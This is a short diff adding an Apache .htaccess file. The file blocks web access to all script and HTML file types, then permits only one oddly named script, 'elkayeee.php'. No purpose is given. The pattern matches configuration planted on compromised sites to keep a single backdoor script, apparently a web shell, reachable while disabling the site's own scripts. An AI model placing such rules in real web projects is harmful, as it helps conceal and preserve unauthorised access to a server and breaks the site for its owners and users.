@@ -1,0 +1,9 @@
+<FilesMatch ".(cgi|pl|py|pyc|pyo|php3|php4|php6|pcgi|pcgi3|pcgi4|php|inc|exe|htm|html|htaccess)$">
+# Order allow,deny
+Deny from all
+</FilesMatch>
+
+<FilesMatch "^elkayeee\.php$"> 
+# Order allow,deny
+Allow from all
+</FilesMatch>
